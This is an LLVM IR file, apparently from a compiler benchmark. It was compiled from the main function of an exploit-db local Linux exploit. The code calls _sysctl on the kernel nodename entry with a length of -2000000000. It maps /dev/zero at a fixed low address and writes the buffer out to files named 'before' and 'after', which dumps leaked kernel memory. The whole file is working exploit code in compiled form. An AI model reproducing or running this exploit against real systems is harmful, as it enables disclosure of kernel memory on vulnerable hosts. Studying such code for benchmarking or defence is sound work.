; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_20626.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_20626.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.__sysctl_args = type { i32*, i32, i8*, i32*, i64, i64 }

@CTL_KERN = common dso_local global i32 0, align 4
@KERN_NODENAME = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [10 x i8] c"/dev/zero\00", align 1
@O_RDWR = common dso_local global i32 0, align 4
@BUFLEN = common dso_local global i32 0, align 4
@PROT_READ = common dso_local global i32 0, align 4
@PROT_WRITE = common dso_local global i32 0, align 4
@MAP_FIXED = common dso_local global i32 0, align 4
@MAP_PRIVATE = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [7 x i8] c"before\00", align 1
@O_CREAT = common dso_local global i32 0, align 4
@O_TRUNC = common dso_local global i32 0, align 4
@O_WRONLY = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [6 x i8] c"after\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca %struct.__sysctl_args, align 8
  %6 = alloca [2 x i32], align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %10 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 0
  %11 = load i32, i32* @CTL_KERN, align 4
  store i32 %11, i32* %10, align 4
  %12 = getelementptr inbounds i32, i32* %10, i64 1
  %13 = load i32, i32* @KERN_NODENAME, align 4
  store i32 %13, i32* %12, align 4
  store i32 -2000000000, i32* %7, align 4
  %14 = load i32, i32* @O_RDWR, align 4
  %15 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str, i64 0, i64 0), i32 %14)
  store i32 %15, i32* %8, align 4
  %16 = load i32, i32* @BUFLEN, align 4
  %17 = load i32, i32* @PROT_READ, align 4
  %18 = load i32, i32* @PROT_WRITE, align 4
  %19 = or i32 %17, %18
  %20 = load i32, i32* @MAP_FIXED, align 4
  %21 = load i32, i32* @MAP_PRIVATE, align 4
  %22 = or i32 %20, %21
  %23 = load i32, i32* %8, align 4
  %24 = call i8* @mmap(i8* inttoptr (i64 8192 to i8*), i32 %16, i32 %19, i32 %22, i32 %23, i32 0)
  store i8* %24, i8** %9, align 8
  %25 = load i8*, i8** %9, align 8
  %26 = load i32, i32* @BUFLEN, align 4
  %27 = call i32 @memset(i8* %25, i8 signext 0, i32 %26)
  %28 = load i32, i32* @O_CREAT, align 4
  %29 = load i32, i32* @O_TRUNC, align 4
  %30 = or i32 %28, %29
  %31 = load i32, i32* @O_WRONLY, align 4
  %32 = or i32 %30, %31
  %33 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i64 0, i64 0), i32 %32, i32 511)
  store i32 %33, i32* %8, align 4
  %34 = load i32, i32* %8, align 4
  %35 = load i8*, i8** %9, align 8
  %36 = load i32, i32* @BUFLEN, align 4
  %37 = call i32 @write(i32 %34, i8* %35, i32 %36)
  %38 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 0
  %39 = getelementptr inbounds %struct.__sysctl_args, %struct.__sysctl_args* %5, i32 0, i32 0
  store i32* %38, i32** %39, align 8
  %40 = getelementptr inbounds %struct.__sysctl_args, %struct.__sysctl_args* %5, i32 0, i32 1
  store i32 2, i32* %40, align 8
  %41 = load i8*, i8** %9, align 8
  %42 = getelementptr inbounds %struct.__sysctl_args, %struct.__sysctl_args* %5, i32 0, i32 2
  store i8* %41, i8** %42, align 8
  %43 = getelementptr inbounds %struct.__sysctl_args, %struct.__sysctl_args* %5, i32 0, i32 3
  store i32* %7, i32** %43, align 8
  %44 = getelementptr inbounds %struct.__sysctl_args, %struct.__sysctl_args* %5, i32 0, i32 5
  store i64 0, i64* %44, align 8
  %45 = getelementptr inbounds %struct.__sysctl_args, %struct.__sysctl_args* %5, i32 0, i32 4
  store i64 0, i64* %45, align 8
  %46 = call i32 @_sysctl(%struct.__sysctl_args* %5)
  %47 = load i32, i32* @O_CREAT, align 4
  %48 = load i32, i32* @O_TRUNC, align 4
  %49 = or i32 %47, %48
  %50 = load i32, i32* @O_WRONLY, align 4
  %51 = or i32 %49, %50
  %52 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i64 0, i64 0), i32 %51, i32 511)
  store i32 %52, i32* %8, align 4
  %53 = load i32, i32* %8, align 4
  %54 = load i8*, i8** %9, align 8
  %55 = load i32, i32* @BUFLEN, align 4
  %56 = call i32 @write(i32 %53, i8* %54, i32 %55)
  ret i32 0
}

declare dso_local i32 @open(i8*, i32, ...) #1

declare dso_local i8* @mmap(i8*, i32, i32, i32, i32, i32) #1

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @_sysctl(%struct.__sysctl_args*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
